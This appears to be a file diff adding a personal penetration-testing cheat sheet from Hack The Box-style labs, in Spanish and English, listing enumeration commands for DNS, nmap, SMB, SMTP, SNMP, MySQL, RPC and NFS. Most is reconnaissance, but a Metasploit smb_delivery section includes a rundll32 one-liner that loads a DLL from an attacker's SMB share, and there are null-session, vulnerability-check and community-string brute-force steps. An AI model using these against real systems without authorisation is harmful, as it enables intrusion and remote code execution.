@@ -1,0 +1,236 @@
+#dig
+Con esta info saco mucha información de un doninio:
+
+dig @10.10.10.83 ctfolympus.htb -t AXFR
+
+#knockd
+Los admins de sistemas tienen una forma de ocultar/filtrar puertos con knockd. Mirar después de un escaneo nmap con/sin esto:
+
+knockd 10.10.10.83 3456 6756 9088      por ejemplo, tengo que encontrar unos numeros para poder realizar la petición.
+
+
+
+# Comprobación cabeceras:
+wget -S http://10.10.10.83 -O /dev/null ; curl -I http://10.10.10.83
+
+# Banner Grabbing: 
+
+nc -v $TARGET 80
+
+telnet $TARGET 80
+
+curl -vX $TARGET
+
+NMAP
+
+# Alive hosts
+nmap -sn 10.0.0.0/24
+
+# Enumeracion de directorios
+nmap -p 80 10.10.10.6 --script http-enum
+
+# scan the 1024 most common ports, run OS detection, run default nmap scripts
+nmap -A -oA nmap <targetip>	
+
+# Scan more deeply, scan all 65535 ports on $targetip with a full connect scan
+nmap -v -sT <targetip> -p- 
+
+# more options
+nmap -sV -sC -v -A <targetip> -p- 
+nmap -sT -sV -A -O -v -p 1–65535 <targetip> 
+
+# my preference
+nmap -sV -sC -v -oA output <targetip>
+nmap -p- -v <targetip>
+
+# more NMAP
+nmap -sU -O
+nmap -sT -O 
+nmap -sC -sV
+nmap -A -sS
+nmap -Pn
+namp -p- -T5
+nmap -O
+nmap -p 1-65535
+scripts: https://nmap.org/nsedoc/
+
+# Kerberos Enumeration
+nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
+
+
+------------------------
+
+SMB
+
+Port 139 and 445- SMB/Samba shares
+Samba is a service that enables the user to share files with other machines
+works the same as a command line FTP client, may browse files without even having credentials
+
+# Share List:
+smbclient --list <targetip>
+smbclient -L <targetip>
+
+# Check SMB vulnerabilities:
+nmap --script=smb-check-vulns.nse <targetip> -p445
+nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.10.10.10 SMB Users & Shares Scan
+nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.10
+
+# basic nmap scripts to enumerate shares and OS discovery
+nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse smb-os-discovery.nse
+
+# Connect using Username
+root@kali:~# smbclient -L <targetip> -U username -p 445
+smbclient -L 10.10.10.59 -U Finance
+smbclient //10.10.10.59/ACCT -U Finance
+para autenticar en una carpeta.
+smbclient //10.10.10.100/C$ -W active.htb -U Administrator
+para entrar en la carpeta C$ donde esta todo con permisos de admin, -W es el workgroup
+smbclient -U SVC_TGS -W ACTIVE.HTB //10.10.10.100/Users
+
+# Connect to Shares
+smbclient \\\\<targetip>\\ShareName
+smbclient \\\\<targetip>\\ShareName -U john
+smbclient //10.0.2.21/share$
+
+# enumarete with smb-shares, -a “do everything” option
+enum4linux -a 192.168.1.120
+
+# learn the machine name and then enumerate with smbclient
+nmblookup -A 192.168.1.102
+smbclient -L <server_name> -I 192.168.1.105
+
+# rpcclient - Connect with a null-session (only works for older windows servers)
+rpcclient -U "" $TARGET
+rpcclient -U james 10.10.10.52
+rpcclient -U "" 192.168.1.105
+(press enter if asks for a password)
+rpcclient $> srvinfo
+rpcclient $> enumdomusers
+rpcclient $> enumalsgroups domain
+rpcclient $> lookupnames administrators
+rpcclient> querydominfo
+rpcclient> enumdomusers
+rpcclient> queryuser john
+
+# scan for vulnerabilities with nmap
+nmap --script "vuln" <targetip> -p139,445
+
+# Para autenticar en un SMB.
+nmap --script smb-enum-shares -p 139,445 [ip]
+nmap --script smb-vuln* -p 139,445 [ip]
+nmap -p 445 -A ip
+
+# smbmap
+smbmap -H 10.0.2.21
+smbmap -H 10.11.1.136 -R "Bob Share"
+smbmap -H 10.11.1.136 --download "Bob Share\Contract Mr. Suzuki.txt"
+
+# nbtscan
+nbtscan $TARGET
+
+# Metasploit
+Rundll32 One-liner to Exploit SMB:
+use exploit/windows/smb/smb_delivery
+msf exploit(windows/smb/smb_delivery) > set srvhost 192.168.1.109
+msf exploit(windows/smb/smb_delivery) > exploit
+rundll32.exe \\192.168.1.109\uYZxHb\test.dll,0
+
+# rpcinfo
+rpcinfo -p $TARGET
+
+# PARA VER ARCHIVOS OCULTOS EN SMB:
+recurse
+después un ls
+
+# DESCARGAR ARCHIVOS EN SMB:
+mget
+
+------------------------
+
+SMTP
+
+# telnet or netcat connection
+nc <targetip> 25
+nc -nvv <targetip> 25
+telnet <targetip> 25
+VRFY root
+# Check for commands
+nmap -script smtp-commands.nse <targetip>
+nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 <targetip>
+
+------------------------------
+
+Port 161/162 UDP - SNMP
+nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS
+
+
+Windows User Accounts
+snmpwalk -c public -v1 $TARGET 
+
+Windows Running Programs
+snmpwalk -c public -v1 $TARGET 
+
+Windows Hostname
+snmpwalk -c public -v1 $TARGET 
+
+Windows Share Information
+snmpwalk -c public -v1 $TARGET 
+
+Windows Share Information
+snmpwalk -c public -v1 $TARGET 
+
+Windows TCP Ports
+snmpwalk -c public -v1 $TARGET
+
+Software Name
+snmpwalk -c public -v1 $TARGET 
+
+brute-force community strings
+onesixtyone -i snmp-ips.txt -c community.txt
+
+snmp-check $TARGET
+-------------------------------
+
+3306 - MySQL
+Name:
+Version:
+nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse INSERTIPADDRESS -p 3306
+
+mysql --host=INSERTIPADDRESS -u root -p
+
+
+
+
+------------------------
+
+Port 111 - RPC
+
+Rpcbind can help us look for NFS-shares. So look out for nfs. Obtain list of services running with RPC:
+
+rpcbind -p <targetip>
+rpcinfo –p x.x.x.x
+
+# using nmap, see which port NFS is listening
+locate *rpc*.nse
+nmap --script rpcinfo.nse <targetip> -p 111
+
+-------------------------
+
+NFS
+
+# to find the public share
+locate *nfs*.nse
+nmap --script nfs-showmount.nse <targetip>
+
+# mount the share to a folder under /tmp
+mkdir /tmp/nfs
+/sbin/mount.nfs <targetip>:/home/box /tmp/nfs
+
+
+
+
+
+
+
+
+
